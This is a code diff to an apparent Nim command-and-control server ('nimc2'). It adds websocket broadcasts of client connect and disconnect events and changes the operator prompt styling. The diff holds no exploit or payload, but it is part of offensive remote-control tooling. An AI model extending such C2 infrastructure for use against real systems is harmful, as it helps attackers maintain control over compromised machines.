@@ -1,4 +1,4 @@
-import terminal, base64, strutils
+import terminal, base64, strutils, ws, json
 
 import types
 
@@ -38,7 +38,7 @@ proc prompt*(server: C2Server) =
     else:
       menu = "client:unknown"
     sign = (if client.isAdmin: "#" else: "$")
-  stdout.styledWrite fgDefault, "(", menu ,")", shellColor, " nimc2 " & sign & " " , fgDefault
+  stdout.styledWrite "(", menu ,")", shellColor, " nimc2 " & sign & " " , fgDefault
   stdout.flushFile()
 
 proc infoLog*(msg: string) =
@@ -48,11 +48,24 @@ proc errorLog*(msg: string) =
   for line in msg.split("\n"):
     stdout.styledWriteLine fgRed, "[!] ", line, fgDefault
 
-proc cConnected*(client: C2Client) =
+proc cConnected*(client: C2Client)  =
+  for wsConnection in client.server.wsConnections:
+    if wsConnection.readyState == Open:
+      discard ws.send(wsConnection, $(%*{
+        "event": "clientconnect",
+        "data": %client
+      }))
+
   stdout.styledWriteLine fgGreen, "[+] ", $client, " connected", fgDefault
   prompt(client.server)
 
 proc cDisconnected*(client: C2Client, reason: string = "client died") =
+  for wsConnection in client.server.wsConnections:
+    if wsConnection.readyState == Open:
+      discard ws.send(wsConnection, $(%*{
+        "event": "clientdisconnect",
+        "data": %client
+      }))
   stdout.styledWriteLine fgRed, "[-] ", $client, " disconnected", fgDefault, " (", reason, ")"
   prompt(client.server)
 
